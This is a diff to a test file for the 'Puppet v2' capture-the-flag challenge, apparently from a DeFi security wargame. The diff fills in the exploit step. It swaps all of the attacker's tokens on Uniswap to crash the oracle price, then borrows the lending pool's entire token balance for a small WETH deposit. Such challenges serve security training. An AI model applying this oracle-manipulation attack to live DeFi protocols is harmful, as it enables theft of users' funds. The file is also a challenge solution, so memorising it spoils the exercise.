@@ -81,7 +81,36 @@ describe('[Challenge] Puppet v2', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        // in this case, we can directly try selling all the tokens for ETH to update the reserves
+        // and then borrow from the lending pool.
+
+        await this.token
+            .connect(attacker)
+            .approve(this.uniswapRouter.address, ethers.constants.MaxUint256);
+        await this.uniswapRouter
+            .connect(attacker)
+            .swapExactTokensForETH(
+                await this.token.balanceOf(attacker.address),
+                0,
+                [this.token.address, this.weth.address],
+                attacker.address,
+                (await ethers.provider.getBlock('latest')).timestamp * 2
+            );
+        
+        console.log(`Attacker resulting balance: ${(await ethers.provider.getBalance(attacker.address)) / 10**18}`);
+        console.log(`Borrow requirement: ${(await this.lendingPool.calculateDepositOfWETHRequired(this.token.balanceOf(this.lendingPool.address))) / 10**18}`);
+        
+        await this.weth
+            .connect(attacker)
+            .deposit({
+              value: await this.lendingPool.calculateDepositOfWETHRequired(this.token.balanceOf(this.lendingPool.address)),
+            });
+        await this.weth
+            .connect(attacker)
+            .approve(this.lendingPool.address, ethers.constants.MaxUint256);
+        await this.lendingPool
+            .connect(attacker)
+            .borrow(this.token.balanceOf(this.lendingPool.address));
     });
 
     after(async function () {
